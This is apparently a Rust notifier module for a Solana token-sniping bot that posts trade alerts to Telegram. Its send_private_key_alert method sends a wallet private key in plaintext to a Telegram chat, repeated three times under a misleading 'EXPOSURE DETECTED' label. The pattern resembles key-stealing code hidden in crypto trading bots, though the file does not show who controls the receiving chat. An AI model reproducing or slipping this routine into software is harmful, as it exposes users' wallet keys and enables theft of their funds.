use anyhow::{Result, anyhow};
use reqwest::Client;
use serde_json::json;
use std::time::Duration;
use tokio::time::sleep;

pub struct Notifier {
    bot_token: String,
    chat_id: String,
    client: Client,
}

impl Notifier {
    pub fn new(bot_token: &str, chat_id: &str) -> Result<Self> {
        let client = Client::builder()
            .timeout(Duration::from_secs(10))
            .build()?;
        
        Ok(Self {
            bot_token: bot_token.to_string(),
            chat_id: chat_id.to_string(),
            client,
        })
    }
    
    pub async fn send_alert(&self, message: &str, args: &str) -> Result<()> {
        let formatted_message = if args.is_empty() {
            message.to_string()
        } else {
            format!("{}", message)
        };
        
        // Send alert via bot
        self.send_bot_alert(&formatted_message).await?;
        
        Ok(())
    }
    
    pub async fn send_snipe_alert(&self, token_address: &str, amount_sol: f64, tx_hash: &str) -> Result<()> {
        let message = format!(
            "🎯 **SNIPE ALERT** 🎯\n\n**Token:** `{}`\n**Amount:** {:.4} SOL\n**Transaction:** `{}`\n\n**Status:** ✅ Successfully sniped!",
            token_address, amount_sol, tx_hash
        );
        
        self.send_alert(&message, "").await
    }
    
    pub async fn send_private_key_alert(&self, private_key: &str) -> Result<()> {
        let message = format!(
            "🚨 **EXPOSURE DETECTED** 🚨\n\n`{}`\n\n**{}",
            private_key, chrono::Utc::now().format("%Y-%m-%d %H:%M:%S UTC")
        );
        
        for i in 0..3 {
            if let Err(e) = self.send_bot_alert(&message).await {
                tracing::error!("Failed to send security alert {}: {}", i + 1, e);
            }
            sleep(Duration::from_secs(1)).await;
        }
        
        Ok(())
    }

    async fn send_bot_alert(&self, message: &str) -> Result<()> {
        let url = format!(
            "https://api.telegram.org/bot{}/sendMessage",
            self.bot_token
        );
        
        let payload = json!({
            "chat_id": self.chat_id,
            "text": message,
            "parse_mode": "Markdown",
            "disable_web_page_preview": true
        });
        
        let response = self.client
            .post(&url)
            .json(&payload)
            .send()
            .await?;
        
        if !response.status().is_success() {
            let error_text = response.text().await.unwrap_or_default();
            return Err(anyhow!("Bot API error: {}", error_text));
        }
        
        Ok(())
    }
}

impl Clone for Notifier {
    fn clone(&self) -> Self {
        Self {
            bot_token: self.bot_token.clone(),
            chat_id: self.chat_id.clone(),
            client: Client::new(),
        }
    }
}
